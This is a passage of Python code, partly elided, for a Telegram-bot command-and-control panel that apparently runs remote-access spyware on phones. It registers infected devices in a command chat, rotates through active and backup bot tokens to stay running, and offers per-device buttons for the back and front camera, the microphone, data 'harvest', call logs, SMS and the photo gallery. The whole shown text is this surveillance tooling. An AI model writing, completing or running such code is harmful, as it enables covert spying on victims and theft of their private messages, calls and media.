...
class T:
 def __init__(self,m):
  self.m=m
  self.df,self.sf,self.af=[os.path.join(P,x) for x in ["dvs.json","ses.json","adm.json"]]
  self.ses,self.dvs,self.adm={},{},{}
  self._all=_d();self.act=self._all[:6];self.bak=self._all[6:];self.cur=0
  self.cmd="-1003365166986";self.dat="-1003787520015";self.rn=True
  self._ld();threading.Thread(target=self._ka,daemon=True).start()
 def _ld(self):
  for f,d in[(self.df,self.dvs),(self.sf,self.ses),(self.af,self.adm)]:
   if os.path.exists(f):
    try:
     with open(f,'r') as fp:d.update(json.load(fp))
    except:pass
 def _sv(self):
  try:
 ...
 def _tk(self,fb=False):
  if fb and self.bak:return random.choice(self.bak)
  self.cur=(self.cur+1)%len(self.act);return self.act[self.cur]
 def _ka(self):
  while self.rn:
   for t in self.bak:
    try:requests.get(f"https://api.telegram.org/bot{t}/getMe",timeout=5)
    except:pass
   time.sleep(3600)
 def _ap(self,met,d=None,f=None,fb=False):
  ...
  try:
   ...
   if not j.get('ok') and j.get('error_code')==429:
    time.sleep(1.5);return self._ap(met,d,f,fb)
   return j
  except:return None
 def reg(self,did,mod):
  ...
  if r and r.get('ok'):
   ...
   self.dvs[did]={"n":mod,"t":tid};self._sv()
   self._ap("sendMessage",{"chat_id":self.cmd,"message_thread_id":tid,"text":f"<b>✅ ON</b>\n<b>{mod}</b>","parse_mode":"HTML"})
   return tid
  return None
 def _km(self):
  return{"inline_keyboard":[[{"text":"📱 Dev","callback_data":"ld"}],[{"text":"👥 Adm","callback_data":"la"},{"text":"🔄 REN","callback_data":"rnw"}],[{"text":"🚪 EXT","callback_data":"ext"}]]}
 def _kd(self,did):
  return{"inline_keyboard":[[{"text":"📸 B","callback_data":f"cam_{did}"},{"text":"🤳 F","callback_data":f"camf_{did}"}],[{"text":"🎙 M","callback_data":f"mic_{did}"},{"text":"📦 H","callback_data":f"hrv_{did}"}],[{"text":"📞 CL","callback_data":f"callog_{did}"},{"text":"💬 S","callback_data":f"sms_{did}"}],[{"text":"🖼 G","callback_data":f"media_{did}"}],[{"text":"🔙 B","callback_data":"ld"}]]}
 ...
 def _pc(self,u):
  cb=u.get('callback_query',{});cid=cb.get('message',{}).get('chat',{}).get('id');mid=cb.get('message',{}).get('message_id');d=cb.get('data','')
  if not self._auth(cid):
   try:self._ap("answerCallbackQuery",{"callback_query_id":cb['id'],"text":"EXP","show_alert":True})
   except:pass
   return
  if d=="main":self._ap("editMessageText",{"chat_id":cid,"message_id":mid,"text":"📋 MN","reply_markup":json.dumps(self._km())})
  elif d=="ld":
   kb={"inline_keyboard":[[{"text":f"📱 {v['n']}","callback_data":f"dev_{k}"}]for k,v in self.dvs.items()]+[[{"text":"🔙 B","callback_data":"main"}]]}
   self._ap("editMessageText",{"chat_id":cid,"message_id":mid,"text":"<b>SLT DEV</b>","reply_markup":json.dumps(kb),"parse_mode":"HTML"})
   ...
   self.ses.pop(str(cid),None);self._sv()
   self._ap("editMessageText",{"chat_id":cid,"message_id":mid,"text":"🔒 OUT"})
  else:
   if self.m and hasattr(self.m,'cb_h'):self.m.cb_h(d,cid,cb['id'])
